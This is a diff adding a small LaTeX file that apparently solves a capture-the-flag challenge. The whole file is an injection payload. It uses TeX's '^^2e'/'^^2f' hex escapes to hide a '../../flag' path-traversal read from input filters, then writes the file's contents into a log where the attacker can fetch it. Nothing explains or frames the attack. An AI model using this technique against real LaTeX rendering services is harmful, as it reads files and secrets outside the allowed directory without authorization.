@@ -1,0 +1,13 @@
+\documentclass{article}
+
+\newwrite\copyfile  % open the file to write to
+\immediate\openout\copyfile=flag.log
+
+\newread\file      % open the file to read from
+\openin\file=^^2e^^2e^^2f^^2e^^2e^^2fflag
+
+\read\file to\fileline
+\immediate\write\copyfile{\unexpanded\expandafter{\fileline}}
+
+\begin{document}
+\end{document}
